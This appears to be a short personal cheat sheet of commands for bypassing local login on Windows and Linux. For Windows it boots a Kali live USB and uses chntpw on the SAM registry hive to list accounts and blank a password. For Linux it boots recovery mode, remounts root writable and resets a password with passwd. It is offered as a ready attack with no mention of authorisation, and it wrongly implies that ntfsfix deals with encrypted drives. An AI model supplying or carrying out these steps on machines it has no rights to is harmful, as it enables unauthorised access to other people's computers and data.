### WINDOWS -> LOGIN-BYPASS ###
======= Requriment =======
Kali-Linux USB-Bootable drive 
Step1:
	-Boot in live forenci mode
	-Go to windows drive by navigating other location...
		if it is encrypted execute the bellow command
			$ fdisk -l
			$ ntfsfix 'divice address'

Step2:
	$ cd Windows/System32/config
	$ ls -l SAM*
	$ chntpw -l SAM //it will list all users
	$ chntpw -u username SAM //then press 1,y
	$ reboot //then it will login without windows password

************** Boom you successfully cleared SAM-DB *******************
### LINUX -> LOGIN-BYPASS ###
=== NOTHING :) JUST TAKE ADDVANTAGE OF DEFAULT CONFIGRATION ===
Step1:
	-Restart the system by pressing shift-key
	-Go to Advanced option for ubuntu
	-ubuntu with (recovery mode)

Step2:
	-From the root option shell prompt
	$ mount -rw -o remount /
	$ passwd username
	-Then write new password
	----------------------
	-If the above failed to change use "mount -n -o remount, rw /"

